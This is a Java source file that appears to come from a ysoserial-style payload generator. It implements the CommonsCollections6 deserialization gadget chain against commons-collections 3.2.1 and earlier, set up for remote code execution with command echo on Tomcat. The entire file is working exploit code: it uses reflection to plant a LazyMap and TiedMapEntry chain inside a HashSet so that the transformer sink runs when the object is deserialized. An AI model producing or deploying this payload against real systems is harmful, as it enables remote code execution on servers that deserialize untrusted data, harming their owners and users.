package com.ppp.chain.commonscollections3;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.annotation.JavaClassHelperType;
import com.ppp.annotation.Middleware;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.MATTHIASKAISER})
@Sink({Sink.InvokerTransformer3})
public class CommonsCollections6 implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(CommonsCollections6.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(CommonsCollections6.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.JavaClass);
        sinksHelper.setSave(true);
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
        javaClassHelper.setMiddleware(Middleware.Tomcat);
        javaClassHelper.setRandomJavaClassName(false);
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(CommonsCollections6.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object transformers) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, s);

        HashSet hashSet = new HashSet(1);
        hashSet.add(s);
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(hashSet);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return hashSet;
    }
}
